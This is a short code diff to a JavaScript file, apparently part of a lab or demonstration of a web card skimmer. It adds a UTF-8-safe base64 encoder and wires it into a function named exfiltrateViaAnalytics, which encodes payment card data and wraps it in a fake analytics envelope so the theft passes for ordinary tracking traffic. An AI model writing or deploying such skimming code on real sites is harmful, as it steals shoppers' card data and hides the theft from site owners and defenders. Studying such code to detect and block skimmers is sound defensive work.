@@ -310,6 +310,19 @@
       }
     }
 
+    function encodeBase64Utf8(value) {
+      const bytes = new TextEncoder().encode(value)
+      let binary = ''
+      const chunkSize = 0x8000
+
+      for (let i = 0; i < bytes.length; i += chunkSize) {
+        const chunk = bytes.subarray(i, i + chunkSize)
+        binary += String.fromCharCode.apply(null, Array.from(chunk))
+      }
+
+      return btoa(binary)
+    }
+
     function installAnalyticsShim() {
       if (window.__labAnalyticsShimInstalled) {
         return
@@ -381,7 +394,7 @@
     function exfiltrateViaAnalytics(data) {
       installAnalyticsShim()
 
-      const encodedPayload = btoa(JSON.stringify(data))
+      const encodedPayload = encodeBase64Utf8(JSON.stringify(data))
       const analyticsEnvelope = createAnalyticsEnvelope(encodedPayload)
 
       log('Encoded card data into analytics payload', {
